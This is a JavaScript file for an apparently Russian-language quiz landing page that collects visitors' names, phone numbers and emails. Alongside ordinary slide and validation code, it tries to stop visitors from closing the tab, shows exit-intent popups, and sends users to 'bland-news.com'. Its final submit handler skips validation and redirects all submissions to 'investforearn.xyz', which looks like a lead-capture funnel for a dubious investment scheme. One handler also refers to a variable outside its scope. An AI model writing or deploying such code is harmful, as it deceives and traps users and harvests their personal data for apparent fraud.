const options = document.querySelectorAll('input[type="radio"]');
const slides = document.querySelectorAll('.slide');
let currentSlide = 0;

options.forEach((option) => {
  option.addEventListener('change', (event) => {
    if (event.target.checked) {
      setTimeout(() => {
        slides[currentSlide].classList.remove('active_1');
        currentSlide++;
        slides[currentSlide].classList.add('active_1');
      }, 500);
    }
  });
});

const startButton = document.getElementById("start-button");
const nextButtons = document.querySelectorAll(".next-button");

const titel = document.getElementById("preview-slide");
// let currentSlide = 0;
// const slideInterval = setInterval(nextSlide, 5000);

// первая кнопка (Начать)
startButton.addEventListener("click", () => {
    slides[currentSlide].classList.remove('active_1');
    currentSlide++;
    slides[currentSlide].classList.add('active_1');
    titel.style.display = "none";

});


nextButtons.forEach((button, index) => {
    button.addEventListener("click", () => {
        const selectedOption = document.querySelector(`input[name="answer-${index + 1}"]:checked`);
        if (selectedOption) {
            slides[currentSlide].classList.add("active");
            titel.style.display = "none";
            // slides[currentSlide].style.display = "none";
            currentSlide++;
            slides[currentSlide].classList.remove("active");
            // slides[currentSlide].style.display = "block";


        }
    });
});


// Попап
    
var today = new Date();
var date = today.getDate() + '.' +(today.getMonth()+1) + '.' + today.getFullYear();
document.getElementById("datetime").innerHTML = date;

window.addEventListener("beforeunload", function(e) {
// Отменяем закрытие вкладки
    e.preventDefault();
// Показываем попап
    document.getElementById("popup").style.display = "block";
});

// Обработчик на кнопку Да
document.getElementById("redirect-button").addEventListener("click", function() {
// Перенаправляем на другой сайт
    window.location.href = "https://bland-news.com/7nyD21v4";
});


// Обработчик на крестик
document.getElementById("popup-close").addEventListener("click", function() {
// Закрываем попап
document.getElementById("popup").style.display = "none";
});

// Обработчик на клик вне попапа
document.getElementById("popup").addEventListener("click", function(e) {
if (e.target == this) {
    // Закрываем попап
    this.style.display = "none";
}
});

document.addEventListener('mousemove', (e) => {
    if (e.clientY < 10) {
        // window.location.replace("http://www.example.com");
        document.getElementById("popup").style.display = "block";
    }
});

    


// Валидация номер телефона на форме
document.addEventListener("DOMContentLoaded", function() {
    var eventCalllback = function(e) {
    var el = e.target,
        clearVal = el.dataset.phoneClear,
        pattern = el.dataset.phonePattern,
        matrix_def = "+7(___) ___-__-__",
        matrix = pattern ? pattern : matrix_def,
        i = 0,
        def = matrix.replace(/\D/g, ""),
        val = e.target.value.replace(/\D/g, "");
    if (clearVal !== 'false' && e.type === 'blur') {
        if (val.length < matrix.match(/([\_\d])/g).length) {
        e.target.value = '';
        return;
        }
    }
    if (def.length >= val.length) val = def;
    e.target.value = matrix.replace(/./g, function(a) {
        return /[_\d]/.test(a) && i < val.length ? val.charAt(i++) : i >= val.length ? "" : a
    });
    }
    var phone_inputs = document.querySelectorAll('[data-phone-pattern]');
    for (let elem of phone_inputs) {
    for (let ev of ['input', 'blur', 'focus']) {
        elem.addEventListener(ev, eventCalllback);
    }
    }
});

// Валидация формы
document.addEventListener("DOMContentLoaded", function() {
  const form = document.querySelector("#contact-form");

  form.addEventListener("submit", function(e) {
    const nameInput = document.querySelector('input[name="name"]');
    const surnameInput = document.querySelector('input[name="surname"]');
    const phoneInput = document.querySelector('input[name="phone"]');
    const emailInput = document.querySelector('input[name="email"]');

    const namePattern = nameInput.getAttribute("data-reg");
    const surnamePattern = surnameInput.getAttribute("data-reg");
    const emailPattern = emailInput.getAttribute("data-reg");

    let isFormValid = true;

    if (!nameInput.value.match(namePattern)) {
      nameInput.style.border = "2px solid red";
      isFormValid = false;
    } else {
      nameInput.style.border = "none";
    }

    if (!surnameInput.value.match(surnamePattern)) {
      surnameInput.style.border = "2px solid red";
      isFormValid = false;
    } else {
      surnameInput.style.border = "none";
    }

    const phoneValue = phoneInput.value.replace(/\D/g, "");
    if (phoneValue.length !== 11 || !/^(8|7)[\d]{10}$/.test(phoneValue)) {
      phoneInput.style.border = "2px solid red";
      isFormValid = false;
    } else {
      phoneInput.style.border = "none";
    }

    const emailValue = emailInput.value;
    if (!emailValue.match(emailPattern)) {
      emailInput.style.border = "2px solid red";
      isFormValid = false;
    } else {
      emailInput.style.border = "none";
    }

    if (!isFormValid) {
      e.preventDefault();
    }
  });
});

form.addEventListener('submit', function(event) {
    event.preventDefault(); 
    window.location.href = 'https://investforearn.xyz/R6R97kbm'; // замените URL на нужный
});

window.onbeforeunload = function() {
    document.getElementById("popup").style.display = "block";
        return "Вы уверены, что хотите покинуть эту страницу?";
};

